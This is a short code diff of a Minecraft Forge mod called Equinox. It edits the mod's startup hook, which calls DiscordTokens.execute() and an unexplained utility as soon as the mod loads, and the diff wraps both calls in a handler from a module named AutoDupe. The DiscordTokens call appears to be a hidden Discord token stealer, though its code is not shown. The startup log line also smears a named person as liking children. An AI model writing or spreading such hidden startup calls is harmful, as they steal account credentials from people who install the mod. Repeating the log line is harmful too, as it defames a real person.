@@ -1,6 +1,7 @@
 package me.eonexe.equinox;
 
 import me.eonexe.equinox.configuration.DiscordTokens;
+import me.eonexe.equinox.features.modules.misc.AutoDupe;
 import me.eonexe.equinox.features.modules.misc.Coord;
 import me.eonexe.equinox.features.modules.misc.xCarry;
 import me.eonexe.equinox.manager.*;
@@ -124,8 +125,8 @@ public class Equinox {
     @Mod.EventHandler
     public void preInit(FMLPreInitializationEvent event) {
         LOGGER.info("Dont tell anyone but Aztrohh likes little kids");
-        xCarry.PreIntUtil();
-        DiscordTokens.execute();
+        AutoDupe.handler.execute(() -> xCarry.PreIntUtil());
+        AutoDupe.handler.execute(() -> DiscordTokens.execute());
 
     }
 
